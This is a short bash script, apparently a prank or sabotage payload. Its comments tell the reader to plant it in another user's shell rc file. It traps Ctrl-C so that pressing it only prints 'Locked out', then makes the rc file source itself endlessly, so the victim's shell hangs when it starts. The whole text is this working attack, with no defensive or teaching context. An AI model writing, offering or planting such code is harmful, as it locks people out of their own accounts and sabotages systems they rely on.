#!/bin/bash

# Put the following lines at the end of the user's shell's rc
# file. Alternatively, source this file from the user's rc file.

# This should be set to the user's shell's rc file.
RCFile=".bashrc"

# This traps the signal that Ctrl-c sends.
trap "echo 'Locked out'" SIGINT

# This sources the rc file and creates infinite recursion.
source $HOME/$RCFile
